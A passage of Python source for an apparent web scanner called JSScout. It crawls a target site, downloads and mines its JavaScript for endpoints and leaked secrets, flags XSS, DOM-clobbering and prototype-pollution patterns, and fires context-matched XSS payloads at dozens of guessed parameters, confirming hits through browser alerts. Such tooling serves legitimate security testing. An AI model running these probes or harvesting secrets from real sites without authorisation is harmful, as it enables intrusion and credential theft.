        except Exception:
            return result

    def get_all_network_js(self) -> set:
        """Return all JS URLs captured from browser network log."""
        js_urls = set()
        if not self.driver:
            return js_urls
        try:
            logs = self.driver.get_log('performance')
            for entry in logs:
                try:
                    msg = json.loads(entry['message'])['message']
                    if msg.get('method') == 'Network.requestWillBeSent':
                        url      = msg['params']['request']['url']
                        req_type = msg['params'].get('type', '')
                        if req_type == 'Script' or url.endswith(('.js', '.mjs')):
                            js_urls.add(url)
                except Exception:
                    pass
        except Exception:
            pass
        return js_urls

    def inject_xss(self, url: str, param: str, payload: str) -> dict:
        """
        Load URL with XSS payload injected into param.
        Checks if an alert/confirm/prompt dialog fires (= XSS confirmed).
        Also checks if payload appears raw in DOM.

        Returns: {'triggered': bool, 'in_dom': bool, 'final_url': str}
        """
        if not self.driver:
            return {'triggered': False, 'in_dom': False, 'final_url': url}

        test_url = f"{url}?{urlencode({param: payload})}"
        result   = {'triggered': False, 'in_dom': False, 'final_url': test_url}

        try:
            self.driver.set_page_load_timeout(self.timeout)

            # Dismiss any existing alert first
            try:
                self.driver.switch_to.alert.dismiss()
            except Exception:
                pass

            self.driver.get(test_url)

            # Wait briefly for JS to execute
            try:
                WebDriverWait(self.driver, 4).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                result['triggered'] = True
                alert.dismiss()
            except TimeoutException:
                pass

            # Also check DOM for unescaped payload markers
            try:
                dom = self.driver.page_source
                if '<img src=x' in dom or '<svg onload' in dom or 'onerror=alert' in dom:
                    result['in_dom'] = True
            except Exception:
                pass

        except Exception:
            pass

        return result

    def scroll_and_click(self, url: str) -> set:
        """
        Load page, scroll down to trigger lazy-loaded content,
        click ALL interactive elements (nav links, buttons, tabs, dropdowns)
        to discover more JS chunks.
        Returns set of new JS URLs discovered.
        """
        if not self.driver:
            return set()

        js_urls = set()
        visited_in_session = {url}

        try:
            self.driver.get(url)
            time.sleep(1.5)

            # Scroll to bottom in steps to trigger lazy loading
            for scroll_pct in [20, 40, 60, 80, 100]:
                self.driver.execute_script(
                    f"window.scrollTo(0, document.body.scrollHeight * {scroll_pct/100});"
                )
                time.sleep(0.4)

            js_urls.update(self.get_all_network_js())

            # Click all nav links, buttons, tabs — collect new JS each time
            clickable_selectors = [
                'nav a', 'header a', '.nav a', '.menu a', '.navbar a',
                '[role="tab"]', '[role="menuitem"]', '[role="button"]',
                'button:not([type="submit"])', '.tab', '.tab-item',
                '.dropdown-toggle', '.accordion-button', '.collapse-toggle',
                'a[href^="#"]',  # anchor links that trigger JS
                '.sidebar a', '.sidebar-menu a',
            ]

            for selector in clickable_selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for elem in elements[:12]:  # limit per selector
                        try:
                            if not elem.is_displayed():
                                continue
                            self.driver.execute_script("arguments[0].click();", elem)
                            time.sleep(0.5)
                            js_urls.update(self.get_all_network_js())
                        except Exception:
                            pass
                except Exception:
                    pass

            # Also try clicking <a> links that stay on same domain (up to 15 unique paths)
            try:
                base_domain = urlparse(url).netloc
                links = self.driver.find_elements(By.TAG_NAME, 'a')
                clicked = 0
                for link in links:
                    if clicked >= 15:
                        break
                    try:
                        href = link.get_attribute('href') or ''
                        if not href or href.startswith(('javascript:', 'mailto:', '#')):
                            continue
                        parsed = urlparse(href)
                        if parsed.netloc != base_domain:
                            continue
                        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        if clean in visited_in_session:
                            continue
                        visited_in_session.add(clean)
                        self.driver.execute_script("arguments[0].click();", link)
                        time.sleep(1.0)
                        js_urls.update(self.get_all_network_js())
                        clicked += 1
                        # Go back
                        self.driver.back()
                        time.sleep(0.8)
                    except Exception:
                        try:
                            self.driver.get(url)
                            time.sleep(1)
                        except Exception:
                            pass
            except Exception:
                pass

        except Exception:
            pass

        return js_urls


# =============================================================================
# CORE SCANNER
# =============================================================================

class JSScout:
    BASE_HEADERS = {
        'User-Agent': (
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/122.0.0.0 Safari/537.36'
        ),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }

    def __init__(self, target: str, output_dir: str,
                 threads: int = 10, timeout: int = 15,
                 max_pages: int = 200, depth: int = 3,
                 cookies: str = None, extra_headers: dict = None,
                 use_selenium: bool = True, log_fn=None):

        if '://' not in target:
            target = 'https://' + target
        parsed           = urlparse(target)
        self.base_url    = f"{parsed.scheme}://{parsed.netloc}"
        self.base_domain = parsed.netloc
        self.output_dir  = Path(output_dir)
        self.threads     = threads
        self.timeout     = timeout
        self.max_pages   = max_pages
        self.depth       = depth
        self.use_selenium= use_selenium
        self.log_fn      = log_fn or print
        self._lock       = threading.Lock()

        self.visited_pages   : set = set()
        self.found_js_urls   : set = set()
        self._dl_hashes      : set = set()
        self._inline_scripts : list = []  # (source_url, script_body)
        self._js_url_map     : dict = {}  # filename -> source_url

        self.session = requests.Session()
        self.session.headers.update(self.BASE_HEADERS)
        self.session.verify = False
        self.session.max_redirects = 5
        if cookies:
            for pair in cookies.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, _, v = pair.partition('=')
                    self.session.cookies.set(k.strip(), v.strip())
        if extra_headers:
            self.session.headers.update(extra_headers)

        # Selenium browser
        self.browser = BrowserManager(timeout=timeout, log_fn=self.log_fn) if use_selenium else None

        self.results = {
            'target':        self.base_url,
            'js_files':      [],
            'endpoints':     {},
            'secrets':       [],
            'xss_findings':  [],
            'poc_findings':  [],
            'dom_clobber':   [],
            'proto_pollution': [],
            'keywords':      {},
            'external_urls': [],
            'payload_library': XSS_PAYLOADS,
        }

    def log(self, msg: str):
        self.log_fn(msg)

    # =========================================================================
    # PUBLIC ENTRY
    # =========================================================================

    def run(self) -> dict:
        t0 = time.time()
        self.output_dir.mkdir(parents=True, exist_ok=True)
        (self.output_dir / 'js').mkdir(exist_ok=True)

        # ── Start Selenium ────────────────────────────────────────────────────
        browser_active = False
        if self.use_selenium and self.browser:
            self.log("[*] Starting Chromium browser...")
            browser_active = self.browser.start()
            if browser_active:
                self.log("[+] Chromium ready — JS rendering enabled")
            else:
                self.log("[!] Falling back to requests-only mode")

        # ── Phase 1: Crawl ────────────────────────────────────────────────────
        self.log(f"[*] Phase 1: Crawling {self.base_url}  (max_pages={self.max_pages}, depth={self.depth})")
        self._crawl(browser_active)
        self.log(f"[+] Crawl done: {len(self.visited_pages)} pages | {len(self.found_js_urls)} JS URLs | {len(self._inline_scripts)} inline scripts")

        # ── Phase 2: Manifest probing ─────────────────────────────────────────
        self.log(f"[*] Phase 2: Probing {len(MANIFEST_PATHS)} manifest paths...")
        self._probe_manifests()
        self.log(f"[+] After manifests: {len(self.found_js_urls)} JS URLs")

        # ── Phase 3: Download JS files ────────────────────────────────────────
        self.log(f"[*] Phase 3: Downloading {len(self.found_js_urls)} JS files...")
        self._download_all(list(self.found_js_urls))
        dl = len(list((self.output_dir / 'js').glob('*.js')))
        self.log(f"[+] Downloaded {dl} unique JS files")

        # ── Phase 4: Deep JS crawl (recursive until fixed point) ──────────────
        self.log("[*] Phase 4: Deep crawl — JS→JS reference chain resolution...")
        new = self._js_deep_crawl()
        dl  = len(list((self.output_dir / 'js').glob('*.js')))
        self.log(f"[+] Deep crawl done: {len(new)} new URLs | {dl} total JS files")

        # ── Phase 4b: Browser scroll on main page to trigger lazy chunks ──────
        if browser_active:
            self.log("[*] Phase 4b: Browser scroll + interact to trigger lazy-loaded JS...")
            extra = self.browser.scroll_and_click(self.base_url)
            truly_new = extra - self.found_js_urls
            if truly_new:
                self.found_js_urls.update(truly_new)
                self.log(f"  [browser] {len(truly_new)} additional JS URLs from browser interaction")
                self._download_all(list(truly_new))
                # One more deep crawl pass
                self._js_deep_crawl()

        # ── Phase 5: Analysis ─────────────────────────────────────────────────
        js_files = sorted((self.output_dir / 'js').glob('*.js'))
        self.log(f"[*] Phase 5: Analyzing {len(js_files)} JS files + {len(self._inline_scripts)} inline scripts...")
        self._analyze_all(js_files)

        # ── Phase 6: XSS Probing ──────────────────────────────────────────────
        self.log("[*] Phase 6: Context-aware XSS parameter probing...")
        self._probe_params(browser_active)
        poc_count = len(self.results.get('poc_findings', []))
        self.log(f"[+] {poc_count} confirmed reflected XSS PoC(s) found")

        # ── Stop browser ──────────────────────────────────────────────────────
        if browser_active:
            self.browser.stop()

        # ── Phase 7: Report ───────────────────────────────────────────────────
        self.log("[*] Phase 7: Writing report...")
        rp = self._write_report()

        elapsed = time.time() - t0
        self.log(f"\n[✓] Done in {elapsed:.1f}s")
        self.log(f"    JS files      : {len(self.results['js_files'])}")
        self.log(f"    Endpoints     : {len(self.results['endpoints'])}")
        self.log(f"    Secrets       : {len(self.results['secrets'])}")
        self.log(f"    XSS sinks     : {len(self.results['xss_findings'])}")
        self.log(f"    Reflected XSS : {poc_count} {'⚡' * min(poc_count,5)}")
        self.log(f"    Report        : {rp}")
        return self.results

    # =========================================================================
    # PHASE 1: BFS CRAWLER
    # =========================================================================

    def _crawl(self, browser_active: bool):
        q             = Queue()
        self._active  = 0
        self._alock   = threading.Lock()

        def enqueue(url, depth):
            with self._alock:
                self._active += 1
            q.put((url, depth))

        def done_one():
            with self._alock:
                self._active -= 1

        self.visited_pages.add(self.base_url)
        enqueue(self.base_url, 0)

        def worker():
            while True:
                try:
                    url, depth = q.get(timeout=2.0)
                except Empty:
                    with self._alock:
                        if self._active == 0:
                            return
                    continue
                try:
                    new_pages = self._crawl_page(url, depth, browser_active)
                    if depth < self.depth:
                        for link in new_pages:
                            with self._lock:
                                if link not in self.visited_pages and len(self.visited_pages) < self.max_pages:
                                    self.visited_pages.add(link)
                                    enqueue(link, depth + 1)
                finally:
                    done_one()

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futs = [pool.submit(worker) for _ in range(self.threads)]
            for f in futs:
                f.result()

    def _crawl_page(self, url: str, depth: int, browser_active: bool) -> set:
        """Fetch one page. Returns new page links."""
        new_js    = set()
        new_pages = set()

        # ── Try Selenium first for JS-rendered content ────────────────────────
        html_content = None
        if browser_active and self.browser and depth <= 1:
            try:
                bres = self.browser.get_page(url, wait_for_js=True)
                if bres.get('html'):
                    html_content = bres['html']
                    # Collect JS URLs the browser actually loaded
                    new_js.update(bres.get('js_urls', set()))
                    new_js.update(bres.get('xhr_urls', set()))
                    # Collect inline scripts
                    for inline in bres.get('inline_scripts', []):
                        if inline.strip():
                            with self._lock:
                                self._inline_scripts.append((url, inline))
                            new_js.update(extract_js_urls(inline, url))
                    # Page links from browser
                    for link in bres.get('page_links', set()):
                        ext = Path(urlparse(link).path).suffix.lower()
                        if ext not in SKIP_EXTS:
                            new_pages.add(link)
                    self.log(f"  [browser] {url[:75]}  +{len(new_js)} JS  +{len(new_pages)} links")
            except Exception as e:
                html_content = None

        # ── Fallback / supplement with requests ───────────────────────────────
        try:
            resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            if resp.status_code >= 400:
                with self._lock:
                    self.found_js_urls.update(js for js in new_js if js.endswith(('.js','.mjs')))
                return new_pages
        except Exception as e:
            self.log(f"  [!] {url[:70]} — {type(e).__name__}")
            return new_pages

        ct      = resp.headers.get('content-type', '').lower()
        content = resp.text[:5_000_000]

        # If Selenium already got HTML, only use requests for regex sweep
        if not html_content:
            html_content = content

        if 'html' in ct and html_content:
            parser = PageParser(url)
            try:
                parser.feed(html_content)
            except Exception:
                pass
            new_js.update(parser.js_urls)
            for inline in parser.inline_scripts:
                with self._lock:
                    self._inline_scripts.append((url, inline))
                new_js.update(extract_js_urls(inline, url))
            for link in parser.page_links:
                ext = Path(urlparse(link).path).suffix.lower()
                if ext not in SKIP_EXTS:
                    new_pages.add(link)

        new_js.update(extract_js_urls(content, url))

        with self._lock:
            added = len(new_js - self.found_js_urls)
            self.found_js_urls.update(new_js)

        if not browser_active:
            self.log(f"  [page] {resp.status_code} {url[:75]}  +{len(new_js)} JS")

        return new_pages

    # =========================================================================
    # PHASE 2: MANIFEST PROBING
    # =========================================================================

    def _probe_manifests(self):
        def probe(path: str):
            url = self.base_url + path
            try:
                resp = self.session.get(url, timeout=min(self.timeout, 5))
                if resp.status_code != 200:
                    return
                ct = resp.headers.get('content-type', '').lower()
                if 'json' in ct:
                    try:
                        data = resp.json()
                        self._extract_js_from_json(data, url)
                    except Exception:
                        pass
                new_js = extract_js_urls(resp.text, url)
                with self._lock:
                    added = len(new_js - self.found_js_urls)
                    if added:
                        self.found_js_urls.update(new_js)
                        self.log(f"  [manifest] {path}  +{added}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            list(pool.map(probe, MANIFEST_PATHS))

    def _extract_js_from_json(self, data, base_url: str):
        if isinstance(data, dict):
            for v in data.values():
                if isinstance(v, str) and (v.endswith('.js') or '.js?' in v):
                    url = urljoin(base_url, v)
                    if url.startswith('http'):
                        with self._lock:
                            self.found_js_urls.add(url)
                elif isinstance(v, (dict, list)):
                    self._extract_js_from_json(v, base_url)
        elif isinstance(data, list):
            for item in data:
                self._extract_js_from_json(item, base_url)

    # =========================================================================
    # PHASE 3: DOWNLOAD
    # =========================================================================

    def _download_all(self, urls: list):
        js_dir         = self.output_dir / 'js'
        existing_names : set = {f.name for f in js_dir.glob('*.js')}

        def dl(url: str):
            # Only download same-domain or CDN JS
            parsed = urlparse(url)
            if not url.startswith(('http://', 'https://')):
                return
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
                if resp.status_code != 200:
                    return
                data = resp.content
                if not data or len(data) < 10:
                    return

                h = hashlib.sha256(data).hexdigest()[:16]
                with self._lock:
                    if h in self._dl_hashes:
                        return
                    self._dl_hashes.add(h)

                path = urlparse(url).path
                name = os.path.basename(path) or 'script.js'
                if not name.endswith(('.js', '.mjs')):
                    name += '.js'
                name = re.sub(r'[^\w.\-]', '_', name)[:120]
                if not name or name in ('.js', '_.js'):
                    name = 'script.js'

                with self._lock:
                    if name in existing_names:
                        stem = name[:-3]
                        i = 1
                        while f'{stem}_{i}.js' in existing_names:
                            i += 1
                        name = f'{stem}_{i}.js'
                    existing_names.add(name)

                (js_dir / name).write_bytes(data)
                with self._lock:
                    self._js_url_map[name] = url
                self.log(f"  [dl] {name}  {len(data)/1024:.1f}KB  <- {url[:70]}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            pool.map(dl, urls)

    # =========================================================================
    # PHASE 4: RECURSIVE JS DEEP CRAWL
    # =========================================================================

    def _js_deep_crawl(self) -> set:
        """
        Iteratively scan downloaded JS files for references to more JS.
        Continues until no new URLs found (fixed-point convergence).
        """
        all_new: set = set()
        already_scanned: set = set()

        for iteration in range(1, 11):
            newly_discovered: set = set()

            for js_file in list((self.output_dir / 'js').glob('*.js')):
                if js_file.name in already_scanned:
                    continue
                already_scanned.add(js_file.name)
                try:
                    js_content = js_file.read_text(encoding='utf-8', errors='replace')
                    found = extract_js_urls(js_content, self.base_url)
                    with self._lock:
                        truly_new = found - self.found_js_urls
                        if truly_new:
                            self.found_js_urls.update(truly_new)
                            newly_discovered.update(truly_new)
                            all_new.update(truly_new)
                except Exception:
                    pass

            if not newly_discovered:
                self.log(f"  [deep crawl] Fixed point after {iteration} pass(es) — {len(all_new)} extra URLs found")
                break

            self.log(f"  [deep crawl] Pass {iteration}: {len(newly_discovered)} new JS URLs — downloading...")
            self._download_all(list(newly_discovered))

        return all_new

    # =========================================================================
    # PHASE 5: ANALYSIS
    # =========================================================================

    def _analyze_all(self, js_files: list):
        endpoints = {}
        secrets   = []
        xss       = []
        dom_cb    = []
        proto     = []
        keywords  = defaultdict(list)
        ext_urls  = set()
        stats     = []

        # Analyze downloaded JS files
        for js_file in js_files:
            try:
                content = js_file.read_text(encoding='utf-8', errors='replace')
                fname   = js_file.name

                for ep in self._find_endpoints(content):
                    if ep not in endpoints:
                        endpoints[ep] = []
                    if fname not in endpoints[ep]:
                        endpoints[ep].append(fname)

                fs = self._find_secrets(content, fname);   secrets.extend(fs)
                fx = self._find_xss(content, fname);       xss.extend(fx)
                fd = self._find_dom_clobber(content, fname); dom_cb.extend(fd)
                fp = self._find_proto(content, fname);     proto.extend(fp)

                lines = content.split('\n')
                for kw, pat in KEYWORDS.items():
                    for i, line in enumerate(lines, 1):
                        if pat.search(line):
                            keywords[kw].append({'file': fname, 'line': i, 'content': line.strip()[:200]})
                            if len(keywords[kw]) >= 15:
                                break

                for m in re.finditer(r'["\'`](https?://[a-zA-Z0-9._\-/:%?#=&+@\[\]{}]+)["\'`]', content):
                    u = m.group(1)
                    if urlparse(u).netloc != self.base_domain:
                        ext_urls.add(u)

                n_ep = sum(1 for files in endpoints.values() if fname in files)
                n_sec = len(fs); n_xss = len(fx)
                stats.append({'name': fname, 'size': js_file.stat().st_size,
                              'endpoints': n_ep, 'secrets': n_sec,
                              'xss_sinks': n_xss, 'minified': self._is_minified(content),
                              'source_url': self._js_url_map.get(fname, '')})
                self.log(f"  [analyze] {fname}: {n_ep} eps  {n_sec} secrets  {n_xss} XSS sinks")

            except Exception as e:
                self.log(f"  [!] {js_file.name}: {e}")

        # Also analyze inline scripts captured during crawl
        inline_xss_count = 0
        seen_inline: set = set()
        for source_url, script_body in self._inline_scripts:
            h = hashlib.md5(script_body.encode()).hexdigest()[:12]
            if h in seen_inline:
                continue
            seen_inline.add(h)
            fx = self._find_xss(script_body, f'inline@{urlparse(source_url).path}')
            if fx:
                xss.extend(fx)
                inline_xss_count += len(fx)
                # Add endpoints from inline scripts too
                for ep in self._find_endpoints(script_body):
                    if ep not in endpoints:
                        endpoints[ep] = []
                    endpoints[ep].append(f'inline@{urlparse(source_url).path}')

        if inline_xss_count:
            self.log(f"  [inline scripts] {inline_xss_count} additional XSS sinks found in inline scripts")

        self.results.update({
            'endpoints':     endpoints, 'secrets':        secrets,
            'xss_findings':  xss,       'dom_clobber':    dom_cb,
            'proto_pollution': proto,   'keywords':       dict(keywords),
            'external_urls': list(ext_urls), 'js_files':  stats,
            'total_js':      len(js_files),
            'visited_pages': sorted(self.visited_pages),
        })

    def _find_endpoints(self, content: str) -> set:
        found = set()
        for pat in ENDPOINT_PATTERNS:
            for m in pat.finditer(content):
                ep = m.group(1).strip()
                if 3 < len(ep) < 200:
                    found.add(ep)
        return found

    def _find_secrets(self, content: str, fname: str) -> list:
        found = []; seen = set()
        SKIP = {'placeholder','example','changeme','your_api_key','your_secret',
                'your_token','undefined','null','true','false','test','demo','xxx'}
        for pat, stype, severity in SECRET_PATTERNS:
            for m in pat.finditer(content):
                val = (m.group(1) if m.lastindex else m.group(0)).strip()
                if val.lower() in SKIP or len(val) < 4:
                    continue
                key = f'{fname}:{stype}:{val[:20]}'
                if key in seen: continue
                seen.add(key)
                line = content[:m.start()].count('\n') + 1
                ctx  = content[max(0,m.start()-60):m.end()+60].replace('\n',' ').strip()
                found.append({'file': fname, 'type': stype, 'severity': severity,
                              'value': val[:120], 'line': line, 'context': ctx[:250]})
        return found

    def _is_xss_false_positive(self, match_text: str, line: str, nearby: str, sink: str) -> tuple:
        """Returns (is_fp: bool, reason: str)."""
        # 1. Inside single-line comment
        comment_pos = line.find('//')
        if comment_pos != -1:
            match_pos = line.find(match_text[:30])
            if match_pos != -1 and match_pos > comment_pos:
                return True, "inside comment"

        # 2. Inside block comment
        if '/*' in nearby and '*/' not in nearby.split('/*')[-1]:
            return True, "inside block comment"

        # 3. Sanitizer nearby
        for san in XSS_SANITIZERS:
            if san in nearby:
                return True, f"sanitizer present: {san}"

        # 4. innerHTML with static string
        if sink == 'innerHTML' and re.search(r'\.innerHTML\s*=\s*["\']', line):
            return True, "innerHTML assigned static string"

        # 5. eval in typeof check
        if sink == 'eval' and 'typeof' in line and 'eval' in line:
            return True, "typeof eval check"

        # 6. eval on string literal
        if sink == 'eval' and re.search(r"eval\s*\(\s*['\"]", line):
            return True, "eval of string literal"

        # 7. setTimeout/setInterval with function reference (not string)
        if sink in ('setTimeout(str)', 'setInterval(str)'):
            m = re.search(r'(?:setTimeout|setInterval)\s*\(\s*([^,\)]+)', line)
            if m:
                arg = m.group(1).strip()
                if not (arg.startswith(("'", '"')) or '+' in arg):
                    return True, "timeout with fn reference"

        # 8. location.href with static URL
        if sink == 'location.href=':
            if re.search(r'location(?:\.href)?\s*=\s*["\'](?:/|https?:)', line):
                return True, "location assigned static URL"

        # 9. $.html() getter (no args)
        if sink == '$.html()':
            if re.search(r'\.html\s*\(\s*\)', line):
                return True, "$.html() getter call"

        # 10. innerHTML with template literal (no ${})
        if sink == 'innerHTML' and re.search(r'\.innerHTML\s*=\s*`[^`$]*`', line):
            return True, "innerHTML with static template literal"

        # 11. Safe variable names
        safe_names = ['template', 'staticHtml', 'safeHtml', 'sanitized', 'purified',
                      'escaped', 'STATIC_', 'TEMPLATE_', 'SVG_', 'defaultHtml']
        for sv in safe_names:
            if sv.lower() in match_text.lower():
                return True, f"safe variable name: {sv}"

        # 12. postMessage with origin check nearby
        if sink == 'postMessage listener':
            origin_checks = ['event.origin', 'e.origin', 'origin ===', 'origin !==',
                             'trustedOrigins', 'allowedOrigins', 'ALLOWED_ORIGINS']
            if any(oc in nearby for oc in origin_checks):
                return True, "postMessage has origin check"

        return False, ""

    def _find_xss(self, content: str, fname: str) -> list:
        found = []; seen = set()
        lines = content.split('\n')
        fp_count = 0

        for pat, sink, severity in XSS_SINKS:
            for m in pat.finditer(content):
                line_no = content[:m.start()].count('\n') + 1
                line    = lines[line_no - 1] if line_no <= len(lines) else ''
                nearby  = content[max(0, m.start()-200):m.end()+200]

                is_fp, reason = self._is_xss_false_positive(m.group(0), line, nearby, sink)
                if is_fp:
                    fp_count += 1
                    continue

                key = f'{sink}:{line_no}'
                if key in seen: continue
                seen.add(key)

                # Check for source→sink flow
                confirmed = any(src_pat.search(nearby) for src_pat, _ in XSS_SOURCES)

                found.append({
                    'file':           fname,
                    'sink':           sink,
                    'severity':       severity,
                    'line':           line_no,
                    'match':          m.group(0)[:120],
                    'context':        line.strip()[:200],
                    'confirmed_flow': confirmed,
                })

        if fp_count:
            self.log(f"  ↳ {fp_count} XSS false positive(s) suppressed in {fname}")

        return found

    def _find_dom_clobber(self, content: str, fname: str) -> list:
        found = []
        DOM_CLOBBER_PATS = [
            re.compile(r'document\[["\'`](\w+)["\'`]\]', re.I),
            re.compile(r'window\[["\'`](\w+)["\'`]\]', re.I),
            re.compile(r'getElementById\s*\(\s*["\'`](\w+)["\'`]\s*\)(?!\.value)', re.I),
        ]
        SAFE_IDS = {'getElementById', 'body', 'head', 'html', 'title', 'location',
                    'cookie', 'domain', 'referrer', 'URL', 'characterSet'}
        seen = set()
        for pat in DOM_CLOBBER_PATS:
            for m in pat.finditer(content):
                name = m.group(1) if m.lastindex else m.group(0)
                if name in SAFE_IDS: continue
                key = f'{fname}:{name}'
                if key in seen: continue
                seen.add(key)
                line = content[:m.start()].count('\n') + 1
                found.append({'file': fname, 'name': name, 'line': line,
                              'context': m.group(0)[:150]})
        return found

    def _find_proto(self, content: str, fname: str) -> list:
        PROTO_PATS = [
            re.compile(r'__proto__\s*\[', re.I),
            re.compile(r'constructor\s*\[\s*["\']prototype["\']', re.I),
            re.compile(r'Object\.assign\s*\(\s*\w+\.prototype', re.I),
            re.compile(r'merge\s*\(\s*\w+\s*,\s*JSON\.parse', re.I),
        ]
        found = []
        for pat in PROTO_PATS:
            for m in pat.finditer(content):
                line = content[:m.start()].count('\n') + 1
                found.append({'file': fname, 'line': line, 'context': m.group(0)[:150]})
        return found

    def _is_minified(self, content: str) -> bool:
        lines = content.split('\n')
        if not lines: return False
        avg_len = sum(len(l) for l in lines) / len(lines)
        return avg_len > 200

    # =========================================================================
    # PHASE 6: CONTEXT-AWARE XSS PARAMETER PROBING
    # =========================================================================

    _PROBE_CANARY  = 'jsSc0utXxZ99'   # alphanumeric — never filtered
    _PROBE_MARKER  = 'JSSCOUT_XSS_7x9z'

    def _probe_params(self, browser_active: bool):
        """
        Phase 6: Full context-aware reflected XSS detection.

        For each (url, param):
          1. Send canary → if not reflected → skip
          2. detect_reflection_context() → find WHERE it's reflected
          3. Pick payloads from CONTEXT_PAYLOADS matching that context
          4. Send each payload → check raw reflection
          5. If browser active: also actually load in browser to confirm alert fires
          6. Store confirmed PoC with exact URL, param, payload, context, evidence
        """

        COMMON_PARAMS = [
            'q','s','search','query','keyword','term','name','user','username',
            'input','text','msg','message','data','value','comment','content',
            'url','redirect','next','return','ref','from','to','back',
            'email','title','body','subject','description','id','page','p',
            'token','action','type','category','tag','filter','sort','order',
            'lang','locale','format','view','mode','tab','section','code','key',
            'file','path','dir','target','dest','redir','error','err','status',
            't','k','v','n','c','r','i','j','m','x','y','z',
        ]

        # probe_targets: base_url -> {'real': set(), 'common': set()}
        probe_targets: dict = {}

        def add_target(base: str, real=None, common=None):
            if base not in probe_targets:
                probe_targets[base] = {'real': set(), 'common': set()}
            if real:
                probe_targets[base]['real'].update(p for p in real if p)
            if common:
                probe_targets[base]['common'].update(p for p in common if p)

        # ── Collect from visited pages ────────────────────────────────────────
        for url in list(self.visited_pages):
            parsed = urlparse(url)
            if parsed.netloc != self.base_domain:
                continue
            base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            real = list(parse_qs(parsed.query).keys())
            add_target(base, real=real, common=COMMON_PARAMS)

        # ── Collect from JS endpoints ─────────────────────────────────────────
        for ep in list(self.results.get('endpoints', {}).keys()):
            if ep.startswith('/') or ep.startswith(self.base_url):
                full = urljoin(self.base_url, ep) if ep.startswith('/') else ep
                p    = urlparse(full)
                if p.netloc and p.netloc != self.base_domain:
                    continue
                base = f"{p.scheme or 'http'}://{p.netloc or self.base_domain}{p.path}"
                real = list(parse_qs(p.query).keys())
                add_target(base, real=real, common=COMMON_PARAMS)

        # ── Form extraction: fetch ALL same-domain pages ───────────────────────
        pages_to_scan = [
            u for u in list(self.visited_pages)
            if urlparse(u).netloc == self.base_domain
        ][:80]

        self.log(f"  [probe] Extracting forms from {len(pages_to_scan)} pages...")
        page_cache: dict = {}

        def fetch_page(url: str):
            try:
                r = self.session.get(url, timeout=min(self.timeout, 8))
                if r.status_code < 400 and 'html' in r.headers.get('content-type', '').lower():
                    page_cache[url] = r.text
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as pool:
            pool.map(fetch_page, pages_to_scan)

        for page_url, html in page_cache.items():
            parser = FormParser(page_url)
            try:
                parser.feed(html)
            except Exception:
                pass

            # Forms
            for form in parser.forms:
                base   = form['action'].split('?')[0]
                fields = [f['name'] for f in form['fields']]
                real_params = list(parse_qs(urlparse(form['action']).query).keys()) + fields
                add_target(base, real=real_params, common=COMMON_PARAMS[:25])

            # href params
            for base, params in parser.href_params.items():
                add_target(base, real=list(params))

            # Also scan inline JS on the page for param patterns
            for m in re.finditer(r'["\'/]([^"\']+)\?([a-zA-Z_]\w{0,30})=', html):
                path  = m.group(1)
                param = m.group(2)
                if '/' in path or path.endswith(('.php', '.asp', '.html', '.jsp')):
                    full = urljoin(page_url, path)
                    p    = urlparse(full)
                    if p.netloc == self.base_domain or not p.netloc:
                        base = f"{p.scheme or 'http'}://{p.netloc or self.base_domain}{p.path}"
                        add_target(base, real=[param])

        # ── Build flat probe list — real params FIRST ─────────────────────────
        all_pairs: list = []
        for base, psets in probe_targets.items():
            ordered = list(psets['real']) + [
                p for p in psets['common'] if p not in psets['real']
            ]
            for param in ordered[:60]:
                all_pairs.append((base, param))

        self.log(f"  [probe] {len(all_pairs)} (url,param) pairs across {len(probe_targets)} URLs")
        self.log(f"  [probe] Strategy: canary→context-detect→context-matched payloads" +
                 (" + browser XSS confirmation" if browser_active else ""))

        all_poc  = []
        poc_lock = threading.Lock()
        seen_poc : set = set()

        def probe_pair(args):
            base, param = args
            pt = min(self.timeout, 8)

            # ── Get baseline response for existing params ──────────────────────
            existing_params = {}
            try:
                p = urlparse(base)
                existing_params = {k: v[0] for k, v in parse_qs(p.query).items()}
            except Exception:
                pass

            # ── Stage 1: canary check ─────────────────────────────────────────
            canary_params = dict(existing_params)
            canary_params[param] = self._PROBE_CANARY
            canary_url = f"{base}?{urlencode(canary_params)}"
            try:
                cr = self.session.get(canary_url, timeout=pt, allow_redirects=True)
                if self._PROBE_CANARY not in cr.text:
                    return   # Not reflected at all — skip
                canary_body = cr.text
            except Exception:
                return

            # ── Stage 2: detect WHERE it's reflected ──────────────────────────
            contexts = detect_reflection_context(canary_body, self._PROBE_CANARY)
            self.log(f"  [canary] REFLECTED {base}?{param}=... → context: {contexts}")

            # ── Stage 3: send context-matched payloads ────────────────────────
            for ctx in contexts:
                payloads = CONTEXT_PAYLOADS.get(ctx, CONTEXT_PAYLOADS['unknown'])
                for payload in payloads:
                    # Embed a detectable marker in payload
                    marked_payload = payload.replace('alert(1)', f'alert("{self._PROBE_MARKER}")')
                    if self._PROBE_MARKER not in marked_payload:
                        # Payload doesn't use alert(1) — use as-is but check for raw reflection
                        marked_payload = payload

                    test_params = dict(existing_params)
                    test_params[param] = marked_payload
                    test_url = f"{base}?{urlencode(test_params)}"

                    try:
                        resp = self.session.get(test_url, timeout=pt, allow_redirects=True)
                        body = resp.text

                        # Check raw reflection of the payload (not escaped)
                        raw_payload_reflected = False
                        # Check some key parts of payload appear unescaped
                        payload_parts = [p for p in [
                            '<img', '<svg', '<script', 'onerror=', 'onload=',
                            'javascript:', 'alert(', 'onmouseover='
                        ] if p in payload]

                        if payload_parts:
                            raw_payload_reflected = any(part in body for part in payload_parts)
                        elif self._PROBE_MARKER in body:
